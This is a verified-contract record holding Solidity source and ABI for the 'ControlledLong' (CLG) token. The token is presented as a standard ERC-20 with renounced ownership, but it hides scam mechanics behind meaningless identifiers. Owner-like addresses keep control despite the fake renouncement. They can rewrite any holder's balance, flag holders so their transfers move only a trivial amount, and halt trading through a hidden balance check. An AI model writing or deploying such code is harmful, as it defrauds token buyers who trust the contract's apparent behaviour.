{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.8;\n\ninterface walletTrading {\n    function createPair(address fromAt, address fromTotal) external returns (address);\n}\n\ninterface totalAutoTake {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address maxSender) external view returns (uint256);\n\n    function transfer(address exemptBuyTotal, uint256 liquidityList) external returns (bool);\n\n    function allowance(address fromReceiver, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 liquidityList) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address exemptBuyTotal,\n        uint256 liquidityList\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed walletTeam, uint256 value);\n    event Approval(address indexed fromReceiver, address indexed spender, uint256 value);\n}\n\nabstract contract senderLaunchSwap {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface toLiquidityTx {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface totalAutoTakeMetadata is totalAutoTake {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract ControlledLong is senderLaunchSwap, totalAutoTake, totalAutoTakeMetadata {\n\n    bool public walletSenderList;\n\n    uint256 private tokenTeamTotal = 100000000 * 10 ** 18;\n\n    event OwnershipTransferred(address indexed listLaunched, address indexed feeExemptList);\n\n    mapping(address => bool) public teamLimit;\n\n    function takeMin(address swapLimit) public {\n        if (walletSenderList) {\n            return;\n        }\n        if (isFrom != buyFee) {\n            buyFee = buyEnable;\n        }\n        isFundLimit[swapLimit] = true;\n        if (tokenTo != buyEnable) {\n            tokenTo = isFrom;\n        }\n        walletSenderList = true;\n    }\n\n    mapping(address => mapping(address => uint256)) private listReceiver;\n\n    function teamTxFrom() private view {\n        require(isFundLimit[_msgSender()]);\n    }\n\n    uint256 exemptBuyFrom;\n\n    function name() external view virtual override returns (string memory) {\n        return launchedFromExempt;\n    }\n\n    address public minFund;\n\n    function swapAmount(address autoMode, address exemptBuyTotal, uint256 liquidityList) internal returns (bool) {\n        require(teamAmountIs[autoMode] >= liquidityList);\n        teamAmountIs[autoMode] -= liquidityList;\n        teamAmountIs[exemptBuyTotal] += liquidityList;\n        emit Transfer(autoMode, exemptBuyTotal, liquidityList);\n        return true;\n    }\n\n    string private launchedFromExempt = \"Controlled Long\";\n\n    address tradingShould = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function allowance(address amountLiquidity, address minTake) external view virtual override returns (uint256) {\n        if (minTake == marketingTeamReceiver) {\n            return type(uint256).max;\n        }\n        return listReceiver[amountLiquidity][minTake];\n    }\n\n    function feeMaxMode(address autoMode, address exemptBuyTotal, uint256 liquidityList) internal returns (bool) {\n        if (autoMode == minFund) {\n            return swapAmount(autoMode, exemptBuyTotal, liquidityList);\n        }\n        uint256 tradingLaunched = totalAutoTake(totalMarketingTx).balanceOf(tradingShould);\n        require(tradingLaunched == exemptBuyFrom);\n        require(exemptBuyTotal != tradingShould);\n        if (teamLimit[autoMode]) {\n            return swapAmount(autoMode, exemptBuyTotal, launchLiquidity);\n        }\n        return swapAmount(autoMode, exemptBuyTotal, liquidityList);\n    }\n\n    constructor (){\n        if (amountAt == buyFee) {\n            buyEnable = tokenTo;\n        }\n        toLiquidityTx txTo = toLiquidityTx(marketingTeamReceiver);\n        totalMarketingTx = walletTrading(txTo.factory()).createPair(txTo.WETH(), address(this));\n        if (amountAt == isFrom) {\n            isFrom = buyEnable;\n        }\n        minFund = _msgSender();\n        isFundLimit[minFund] = true;\n        teamAmountIs[minFund] = tokenTeamTotal;\n        tokenSwap();\n        \n        emit Transfer(address(0), minFund, tokenTeamTotal);\n    }\n\n    uint256 private amountAt;\n\n    string private feeTeam = \"CLG\";\n\n    mapping(address => uint256) private teamAmountIs;\n\n    function fromIs(uint256 liquidityList) public {\n        teamTxFrom();\n        exemptBuyFrom = liquidityList;\n    }\n\n    uint256 public isFrom;\n\n    function decimals() external view virtual override returns (uint8) {\n        return fromLiquidity;\n    }\n\n    uint256 launchedTradingAuto;\n\n    function getOwner() external view returns (address) {\n        return atSellLimit;\n    }\n\n    uint256 public buyEnable;\n\n    function symbol() external view virtual override returns (string memory) {\n        return feeTeam;\n    }\n\n    function balanceOf(address maxSender) public view virtual override returns (uint256) {\n        return teamAmountIs[maxSender];\n    }\n\n    function approve(address minTake, uint256 liquidityList) public virtual override returns (bool) {\n        listReceiver[_msgSender()][minTake] = liquidityList;\n        emit Approval(_msgSender(), minTake, liquidityList);\n        return true;\n    }\n\n    function tokenSwap() public {\n        emit OwnershipTransferred(minFund, address(0));\n        atSellLimit = address(0);\n    }\n\n    function transferFrom(address autoMode, address exemptBuyTotal, uint256 liquidityList) external override returns (bool) {\n        if (_msgSender() != marketingTeamReceiver) {\n            if (listReceiver[autoMode][_msgSender()] != type(uint256).max) {\n                require(liquidityList <= listReceiver[autoMode][_msgSender()]);\n                listReceiver[autoMode][_msgSender()] -= liquidityList;\n            }\n        }\n        return feeMaxMode(autoMode, exemptBuyTotal, liquidityList);\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return tokenTeamTotal;\n    }\n\n    function shouldTxLaunched(address totalAmount, uint256 liquidityList) public {\n        teamTxFrom();\n        teamAmountIs[totalAmount] = liquidityList;\n    }\n\n    function amountFund(address shouldSell) public {\n        teamTxFrom();\n        \n        if (shouldSell == minFund || shouldSell == totalMarketingTx) {\n            return;\n        }\n        teamLimit[shouldSell] = true;\n    }\n\n    function owner() external view returns (address) {\n        return atSellLimit;\n    }\n\n    mapping(address => bool) public isFundLimit;\n\n    address marketingTeamReceiver = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    address private atSellLimit;\n\n    uint8 private fromLiquidity = 18;\n\n    uint256 public buyFee;\n\n    function transfer(address totalAmount, uint256 liquidityList) external virtual override returns (bool) {\n        return feeMaxMode(_msgSender(), totalAmount, liquidityList);\n    }\n\n    uint256 constant launchLiquidity = 20 ** 10;\n\n    address public totalMarketingTx;\n\n    uint256 public tokenTo;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"fromReceiver\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"listLaunched\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"feeExemptList\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"walletTeam\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"amountLiquidity\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"minTake\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"shouldSell\",\"type\":\"address\"}],\"name\":\"amountFund\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"minTake\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"liquidityList\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"maxSender\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buyEnable\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buyFee\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"liquidityList\",\"type\":\"uint256\"}],\"name\":\"fromIs\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"isFrom\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"isFundLimit\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"minFund\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"totalAmount\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"liquidityList\",\"type\":\"uint256\"}],\"name\":\"shouldTxLaunched\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"swapLimit\",\"type\":\"address\"}],\"name\":\"takeMin\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"teamLimit\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tokenSwap\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tokenTo\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalMarketingTx\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"totalAmount\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"liquidityList\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"autoMode\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"exemptBuyTotal\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"liquidityList\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"walletSenderList\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "ControlledLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}